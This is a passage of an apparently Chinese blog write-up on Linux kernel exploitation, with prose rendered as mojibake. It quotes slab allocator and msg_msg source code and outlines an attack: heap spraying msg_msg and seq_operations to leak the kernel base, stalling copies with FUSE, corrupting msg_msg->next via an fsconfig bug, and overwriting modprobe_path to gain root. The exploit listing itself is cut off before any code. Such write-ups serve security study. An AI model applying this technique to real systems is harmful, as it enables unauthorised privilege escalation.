<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦å…³æ³¨ä¸‹é¢çš„<code>__kmalloc</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä¼šå…ˆè¿›å…¥åˆ°<code>kmalloc_slab</code>è·å–å¯¹åº”çš„<code>slab</code>ï¼Œå…¶å®æ ¹æ®åŠ¨æ€è°ƒè¯•çš„ç»“æœçœ‹åˆ°çš„æ˜¯è¿™é‡Œçš„slabä¸åˆ†é…<code>ctx-&gt;legacy_data</code>æ—¶è¿›å…¥<code>kmem_cache_alloc_trace</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€è‡´çš„æ‰€ä»¥æˆ‘å½“æ—¶å°±å¾ˆè¿·æƒ‘ï¼Œéšå³è¯·æ•™äº†a3åˆçœ‹äº†ä¸€ä¸‹<code>linux kernel 5.9</code>çš„commitæ‰çŸ¥é“ä¼šåœ¨<code>slab_alloc</code>å‡½æ•°ä¸­å‡ºç°é—®é¢˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">	s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">	&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line">		 unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">	barrier();</span><br><span class="line"></span><br><span class="line">	object = c-&gt;freelist;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">				object, tid,</span><br><span class="line">				next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">			note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125;</span><br><span class="line">		prefetch_freepointer(s, next_object);</span><br><span class="line">		stat(s, ALLOC_FASTPATH);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	maybe_wipe_obj_freeptr(s, object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)</span><br><span class="line">		<span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">	slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯å¯¹<code>slab_alloc_node</code>å‡½æ•°çš„å¥—å¨ƒæ“ä½œï¼Œç„¶è€Œ<code>slab_alloc_node</code>å‡½æ•°å†…éƒ¨é¦–å…ˆä¼šè°ƒç”¨<code>slab_pre_alloc_hook</code>å‡½æ•°ï¼Œèµ·å…ˆå¹¶æœªæ³¨æ„åˆ°å…¶è¿”å›å€¼ä¹Ÿæ˜¯sæ‰€ä»¥å¹¶æœªå½“å›äº‹ï¼Œé‚£ä¹ˆç°åœ¨è¯¦ç»†åˆ†æä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache *<span class="title">slab_pre_alloc_hook</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">						     <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	flags &amp;= gfp_allowed_mask;</span><br><span class="line"></span><br><span class="line">	fs_reclaim_acquire(flags);</span><br><span class="line">	fs_reclaim_release(flags);</span><br><span class="line"></span><br><span class="line">	might_sleep_if(gfpflags_allow_blocking(flags));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (should_failslab(s, flags))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp;</span><br><span class="line">	    ((flags &amp; __GFP_ACCOUNT) || (s-&gt;flags &amp; SLAB_ACCOUNT)))</span><br><span class="line">		<span class="keyword">return</span> memcg_kmem_get_cache(s);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€åä¼šåˆ¤æ–­æ˜¯å¦å¼€å¯äº†<code>memcg</code>é€‰é¡¹ï¼Œå¹¶æ£€æµ‹è°ƒç”¨æ—¶çš„flagsï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªä½ç½®å¯¼è‡´slabæ”¹å˜äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">memcg_kmem_get_cache</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">memcg_cachep</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> *<span class="title">arr</span>;</span></span><br><span class="line">	<span class="keyword">int</span> kmemcg_id;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!is_root_cache(cachep));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (memcg_kmem_bypass())</span><br><span class="line">		<span class="keyword">return</span> cachep;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(current-&gt;active_memcg))</span><br><span class="line">		memcg = current-&gt;active_memcg;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		memcg = mem_cgroup_from_task(current);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!memcg || memcg == root_mem_cgroup)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	kmemcg_id = READ_ONCE(memcg-&gt;kmemcg_id);</span><br><span class="line">	<span class="keyword">if</span> (kmemcg_id &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	arr = rcu_dereference(cachep-&gt;memcg_params.memcg_caches);</span><br><span class="line"></span><br><span class="line">	memcg_cachep = READ_ONCE(arr-&gt;entries[kmemcg_id]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!memcg_cachep))</span><br><span class="line">		memcg_schedule_kmem_cache_create(memcg, cachep);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (percpu_ref_tryget(&amp;memcg_cachep-&gt;memcg_params.refcnt))</span><br><span class="line">		cachep = memcg_cachep;</span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> cachep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥å‡½æ•°å†…éƒ¨æŸ¥çœ‹ä¼šå‘ç°å…¶å°±æ˜¯å¯¹é¢å¤–çš„ç»“æ„ä½“åšçš„ä¸€ç³»åˆ—æ“ä½œ</p>
<h3 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h3><p>è‡³æ­¤å¯ä»¥å¼€å§‹è®¤çœŸåˆ†æå…³äºæ­¤åˆ©ç”¨æ–¹æ³•äº†ï¼Œé¦–å…ˆè€ƒè™‘çš„æ˜¯å¦‚ä½•å®ç°æ³„æ¼å†…æ ¸åœ°å€ã€‚æˆ‘ä»¬çŸ¥é“<code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>next</code>æŒ‡é’ˆæŒ‡å‘çš„æ˜¯<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„ä½“åœ¨å‰é¢çš„æ–‡ç« ä¸­æåˆ°è¿‡ï¼Œå½“æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯å¤§å°å¤§äº<code>0xfd0</code>æ—¶å°†è¶…å‡ºèŒƒå›´çš„å†…å®¹è¡¥å……åˆ°<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œæ€»ä½“ç»“æ„å°±æ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨çš„ç»“æ„ã€‚è¿™é‡Œé€‰æ‹©çš„åŠæ³•è‚¯å®šä¸èƒ½æ˜¯å†…å­˜æœç´¢ï¼Œè¿™æ ·å­˜åœ¨çš„é—®é¢˜å¤ªå¤šäº†ï¼Œå¾ˆå®¹æ˜“é€ æˆ<code>kernel panic</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³æ³¨<code>msg_msgseg</code>ç»“æ„ä½“çš„åˆ†é…è¿‡ç¨‹å¯ä»¥çŸ¥é“çš„æ˜¯åœ¨Linux kernel 5.4ç‰ˆæœ¬ä¾æ—§æ˜¯é€šè¿‡æ™®é€šçš„slabç”³è¯·çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„é€‰æ‹©æ˜¯å°½å¯èƒ½å°çš„ç”Ÿæˆ<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œéšåä½¿ç”¨<code>seq_operations</code>ç»“æ„ä½“æ¥æ³„æ¼å‡ºå†…æ ¸åŸºåœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­ä»‹ç»è¿‡è¿™ä¸ªç»“æ„ä½“ï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ï¼Œè¿™ä¸ªç»“æ„ä½“æ˜¯å†…éƒ¨å…¨ä¸ºå‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œæ‰€ä»¥å¯ä»¥å¾ˆè½»æ¾çš„æ³„æ¼ã€‚æŒ‰ç…§a3çš„åšæ³•ï¼Œè¿™é‡Œæ³„æ¼çš„åŠæ³•æ˜¯åœ¨æ¯ç”Ÿæˆä¸€ä¸ª<code>msg_msgseg</code>æ—¶å°±åˆ†é…ä¸€ä¸ª<code>seq_operations</code>ç»“æ„ä½“ï¼Œåœ¨æœ€åå®Œæˆ<code>msg_msg</code>ç»“æ„ä½“çš„å †å–·ä¹‹ååˆå¤§é‡å †å–·<code>seq_operations</code>ç»“æ„ä½“ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜æˆåŠŸç‡ä½¿äºŒè€…æŒ¨åœ¨ä¸€èµ·å†é€šè¿‡ä¿®æ”¹<code>m_ts</code>æˆå‘˜å³å¯å®ç°æ³„æ¼ã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦è€ƒè™‘çš„æ˜¯ä»»æ„åœ°å€å†™çš„é—®é¢˜äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨å¯¹<code>msg_msg</code>å†™å®Œä¹‹åä¼šè¿›å…¥ä¸‹é¢çš„forå¾ªç¯ï¼Œå…¶ä¼šæ ¹æ®<code>next</code>æŒ‡é’ˆç„¶åå†è¿›è¡Œå†™ï¼Œåé¢çš„å†™å°±æ˜¯å†™å…¥åˆ°<code>msg_msgseg</code>ç»“æ„ä½“ä¸­äº†ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨ç¬¬ä¸€æ¬¡å†™çš„æ—¶å€™ä¿®æ”¹æ‰<code>msg_msg-&gt;next</code>æŒ‡é’ˆå³å¯å®ç°ä»»æ„åœ°å€å†™äº†ã€‚</p>
<p>é¢å¯¹ä¸Šé¢çš„æ€è·¯ï¼Œä½¿ç”¨<code>userfaultfd</code>æ˜¯å¾ˆæ˜æ˜¾å¯ä»¥å®ç°çš„ï¼Œä¸è¿‡æ—¢ç„¶è¿™ç¯‡æ–‡ç« æåˆ°äº†<code>FUSE</code>é‚£ä¹ˆè¿™é‡Œè‚¯å®šå°±ä½¿ç”¨<code>FUSE</code>äº†ï¼Œä¸è¿‡æ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥è¿™é‡Œçš„æ•´ä½“æ€è·¯å°±æ˜¯é€šè¿‡<code>mmap</code>åˆ›å»ºä¸¤å—è¿ç»­çš„å†…å­˜åŒºåŸŸï¼Œè®©åä¸€å—å†…å­˜åŒºåŸŸå’Œ<code>FUSE</code>æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶åšæ˜ å°„ï¼Œé‚£ä¹ˆåœ¨è¯»å–ä¸‹ä¸€å—å†…å­˜æ—¶å°±ä¼šè¿›å…¥åˆ°æˆ‘ä»¬é¢„å…ˆå†™åˆ°çš„<code>read</code>å‡½æ•°ä¸­å»äº†ï¼Œåœ¨è¿™ä¸ªå¤„ç†å‡½æ•°ä¸­ä½¿ç”¨<code>fsconfig</code>ä¸­çš„æ¼æ´å»ä¿®æ”¹æ‰<code>msg_msg-&gt;next</code>æŒ‡é’ˆï¼Œåœ¨ç»“æŸå¤„ç†å‡½æ•°ä¹‹åå°±ä¼šç»§ç»­å¾€å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹çš„æŒ‡é’ˆåœ°å€å†™å…¥å†…å®¹äº†ï¼Œå®Œæˆäº†ä»»æ„åœ°å€å†™ã€‚è¿™é‡Œå› ä¸ºåªæ³„æ¼äº†å†…æ ¸åŸºåœ°å€æ‰€ä»¥è¿™é‡Œå†™çš„åœ°æ–¹ä¹Ÿé€‰æ‹©çš„æ˜¯<code>modprobe_path</code>è¿›è¡Œææƒã€‚</p>
<h3 id="ç»¼ä¸Šå¯å¾—exp"><a href="#ç»¼ä¸Šå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šå¯å¾—exp"></a>ç»¼ä¸Šå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 